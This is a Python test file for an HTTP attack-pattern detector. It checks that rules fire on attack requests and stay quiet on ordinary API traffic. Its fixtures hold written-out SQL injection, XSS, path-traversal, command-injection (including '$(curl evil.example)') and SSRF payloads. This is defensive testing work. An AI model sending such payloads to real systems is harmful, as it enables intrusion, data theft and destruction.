"""HTTP attack-pattern analysis (Phase 7): every rule fires on its attacks and stays quiet on
ordinary API traffic. Detection quality is two-sided; both sides are tested."""

from __future__ import annotations

import json

import pytest

from app.models.security_event import EventCategory, Severity
from app.security.http_analysis import (
    MAX_BODY,
    REDACTED,
    RULES,
    SNIPPET_MAX,
    InspectedRequest,
    analyze,
    event_severity,
    normalize,
)

pytestmark = pytest.mark.security


def _query(value: str, name: str = "q") -> InspectedRequest:
    return InspectedRequest(method="GET", path="/api/v1/users", query_string=f"{name}={value}")


def _body(payload: object, **kwargs: object) -> InspectedRequest:
    return InspectedRequest(
        method="POST",
        path="/api/v1/users",
        content_type="application/json",
        body=json.dumps(payload).encode(),
        **kwargs,  # type: ignore[arg-type]
    )


ATTACKS: list[tuple[str, InspectedRequest]] = [
    ("SQLI-001", _query("1%20UNION%20ALL%20SELECT%20username,password%20FROM%20users")),
    ("SQLI-001", _query("1/**/union/**/select/**/1")),
    ("SQLI-002", _query("x%27%20OR%201%3D1")),
    ("SQLI-002", _body({"email": "a' or 'a'='a"})),
    ("SQLI-003", _body({"email": "admin'--"})),
    ("SQLI-004", _query("1;%20DROP%20TABLE%20users")),
    ("SQLI-005", _query("1%20AND%20pg_sleep(5)")),
    ("SQLI-005", _body({"name": "x'; WAITFOR DELAY '0:0:5"})),
    ("SQLI-006", _query("1%20and%20@@version")),
    ("SQLI-006", _body({"q": "select * from information_schema.tables"})),
    ("XSS-001", _body({"display_name": "<script>alert(1)</script>"})),
    ("XSS-002", _query("%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E")),
    ("XSS-003", _body({"website": "javascript:alert(document.cookie)"})),
    ("XSS-004", _body({"bio": "<iframe src=//evil.example>"})),
    ("TRAV-001", InspectedRequest(method="GET", path="/api/v1/files/..%2f..%2fsecrets")),
    ("TRAV-001", _query("..%5c..%5cwindows", name="file")),
    ("TRAV-002", _query("/etc/passwd", name="path")),
    ("CMDI-001", _body({"host": "8.8.8.8; cat /etc/hosts"})),
    ("CMDI-001", _query("x%7C%20whoami")),
    ("CMDI-001", _body({"host": "$(curl evil.example)"})),
    ("SSRF-001", _body({"url": "http://169.254.169.254/latest/meta-data/"})),
    ("SSRF-002", _body({"url": "http://127.0.0.1:8000/admin"})),
    ("SSRF-002", _body({"url": "file:///etc/hosts"})),
    ("SCAN-001", InspectedRequest(method="GET", path="/api/v1/health", user_agent="sqlmap/1.8")),
    (
        "RECON-001",
        InspectedRequest(method="GET", path="/api/.env", route_matched=False),
    ),
]


@pytest.mark.parametrize(
    ("rule_id", "request_"), ATTACKS, ids=[f"{r}-{i}" for i, (r, _) in enumerate(ATTACKS)]
)
def test_attacks_are_detected(rule_id: str, request_: InspectedRequest) -> None:
    found = {f.rule_id for f in analyze(request_).findings}
    assert rule_id in found, found


def test_every_rule_has_an_attack_case() -> None:
    assert {r.rule_id for r in RULES} == {rule_id for rule_id, _ in ATTACKS}


BENIGN: list[InspectedRequest] = [
    _body({"email": "siobhan.o'brien@example.com", "display_name": "Siobhán O'Brien"}),
    _body({"display_name": "Team 'A' #1", "role": "ANALYST"}),
    _body({"display_name": "Research & Development", "note": "fish & chips, R&D"}),
    _body({"password": "C0rrect-Horse;Battery|Staple$(42)!", "email": "user@example.com"}),
    _body({"website": "https://example.com/docs?page=2&sort=asc"}),
    _body({"comment": "Select the user, then union the two lists in the report."}),
    _body({"text": "Use 1 = 1 spacing; and/or keep formatting.", "count": 3, "ok": True}),
    _query("2026-10-07T12:00:00%2B00:00", name="since"),
    _query("auth.login", name="action"),
    _query("critical", name="min_severity"),
    InspectedRequest(method="GET", path="/api/v1/users/6f1c9e0a-2b7d-4c1e-9a3f-1d2e3f4a5b6c"),
    InspectedRequest(
        method="GET",
        path="/api/v1/health",
        user_agent="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36",
        referer="http://localhost:8080/apis",
    ),
    InspectedRequest(method="GET", path="/api/v1/health", user_agent="curl/8.10.1"),
    InspectedRequest(method="GET", path="/api/v1/health", user_agent="Python-urllib/3.12"),
    InspectedRequest(method="GET", path="/api/v1/nothing-here", route_matched=False),
]


@pytest.mark.parametrize("request_", BENIGN, ids=lambda r: f"{r.method}-{r.path}")
def test_ordinary_traffic_is_not_flagged(request_: InspectedRequest) -> None:
    assert analyze(request_).findings == ()


def test_double_encoding_is_decoded() -> None:
    assert normalize("%253Cscript%253E") == "<script>"
    assert {f.rule_id for f in analyze(_query("%253Cscript%253Ealert(1)")).findings} == {"XSS-001"}


def test_sensitive_fields_are_inspected_but_never_quoted() -> None:
    analysis = analyze(_body({"email": "a@example.com", "password": "x' OR 1=1 --"}))
    assert analysis.findings, "an injection in a password field is still an attack"
    assert {f.snippet for f in analysis.findings} == {REDACTED}
    assert all(f.field == "password" for f in analysis.findings)


def test_sensitive_query_parameters_are_redacted() -> None:
    analysis = analyze(_query("x%27%20OR%201%3D1", name="token"))
    assert analysis.findings
    assert analysis.findings[0].snippet == REDACTED


def test_excluded_fields_are_skipped_but_others_are_not() -> None:
    note = {"body": "Attacker sent ' UNION SELECT password FROM users --", "tag": "<script>"}
    analysis = analyze(_body(note, excluded_fields=frozenset({"body"})))
    assert {f.rule_id for f in analysis.findings} == {"XSS-001"}
    assert all(f.field == "tag" for f in analysis.findings)


def test_recon_paths_on_real_routes_are_not_flagged() -> None:
    request = InspectedRequest(method="GET", path="/api/.env", route_matched=True)
    assert analyze(request).findings == ()


def test_snippets_are_bounded_and_free_of_control_characters() -> None:
    payload = "A" * 500 + "\r\n<script>\x00\x1b[31m" + "B" * 500
    finding = analyze(_body({"x": payload})).findings[0]
    assert len(finding.snippet) <= SNIPPET_MAX
    assert not any(ord(c) < 32 for c in finding.snippet)
    assert "<script>" in finding.snippet


def test_input_is_bounded() -> None:
    hidden = "x" * MAX_BODY + "<script>"
    request = InspectedRequest(
        method="POST", path="/", content_type="text/plain", body=hidden.encode()
    )
    assert analyze(request).findings == ()


def test_malformed_json_is_inspected_as_text() -> None:
    request = InspectedRequest(
        method="POST", path="/", content_type="application/json", body=b'{"a": "<script>'
    )
    assert {f.rule_id for f in analyze(request).findings} == {"XSS-001"}


def test_each_rule_reports_once() -> None:
    analysis = analyze(_body({"a": "<script>", "b": "<script>", "c": "<script>"}))
    assert [f.rule_id for f in analysis.findings] == ["XSS-001"]


def test_severity_and_category_follow_the_worst_finding() -> None:
    analysis = analyze(_body({"a": "<script>", "b": "1 UNION SELECT 1"}))
    assert analysis.severity is Severity.HIGH
    assert analysis.category is EventCategory.SQL_INJECTION


def test_success_responses_raise_injection_severity() -> None:
    analysis = analyze(_body({"a": "<script>"}))
    assert event_severity(analysis, 422) is Severity.MEDIUM
    assert event_severity(analysis, 200) is Severity.HIGH
    scanner = analyze(InspectedRequest(method="GET", path="/", user_agent="nikto"))
    assert event_severity(scanner, 200) is Severity.LOW  # not an injection: unchanged
